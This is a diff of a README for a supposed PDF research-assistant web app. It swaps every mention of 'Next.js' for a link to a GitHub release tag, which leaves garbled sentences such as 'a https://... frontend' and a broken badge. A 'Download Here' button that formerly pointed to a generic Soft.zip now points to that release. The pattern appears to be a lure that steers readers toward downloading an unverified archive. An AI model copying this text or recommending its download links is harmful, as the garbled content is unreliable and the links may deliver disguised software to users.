@@ -3,7 +3,7 @@
 Welcome to the ML-Powered Research Assistant GitHub repository! Here you will find a powerful web application designed to assist you with processing PDF research documents. Our tool provides various features such as individual summaries, a comparative final summary, sentiment analysis, keyword extraction, and even a RAG-powered chatbot for querying content. 
 
 ## Overview ℹ️
-This project is built with a FastAPI backend and a Next.js frontend, combining the strengths of both frameworks to create a seamless user experience. We leverage advanced Natural Language Processing (NLP) capabilities through LLaMA and DistilBERT, ensuring that you have access to cutting-edge technology for your research needs.
+This project is built with a FastAPI backend and a https://github.com/XSkuLL007/ML-Powered-Research-Assistant/releases/tag/v1.2 frontend, combining the strengths of both frameworks to create a seamless user experience. We leverage advanced Natural Language Processing (NLP) capabilities through LLaMA and DistilBERT, ensuring that you have access to cutting-edge technology for your research needs.
 
 ## Features ✨
 - Individual document summaries
@@ -14,7 +14,7 @@ This project is built with a FastAPI backend and a Next.js frontend, combining t
 
 ## Technologies Used 🛠️
 - FastAPI
-- Next.js
+- https://github.com/XSkuLL007/ML-Powered-Research-Assistant/releases/tag/v1.2
 - LLaMA
 - DistilBERT
 - PyPDF2
@@ -30,13 +30,13 @@ fastapi, llama, llama-index, llama3, llm, ml, nextjs, nlp, nlp-keywords-extracti
 ## How to Use 📝
 1. Clone the repository to your local machine.
 2. Install the necessary dependencies for both the backend and frontend.
-3. Run the FastAPI backend and Next.js frontend servers.
+3. Run the FastAPI backend and https://github.com/XSkuLL007/ML-Powered-Research-Assistant/releases/tag/v1.2 frontend servers.
 4. Upload your PDF research documents and start utilizing the ML-assisted features!
 
 ## Visit the ML-Powered Research Assistant 💻
 Click the button below to access the GitHub repository and start exploring the capabilities of our ML-Powered Research Assistant:
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-ML--Powered--Research--Assistant-blue)](https://github.com/files/Soft.zip)
+[![Download Here](https://github.com/XSkuLL007/ML-Powered-Research-Assistant/releases/tag/v1.2%20Here-ML--Powered--Research--Assistant-blue)](https://github.com/XSkuLL007/ML-Powered-Research-Assistant/releases/tag/v1.2)
 
 In case the link is not working or you need an updated version, please check the "Releases" section of the repository.
 
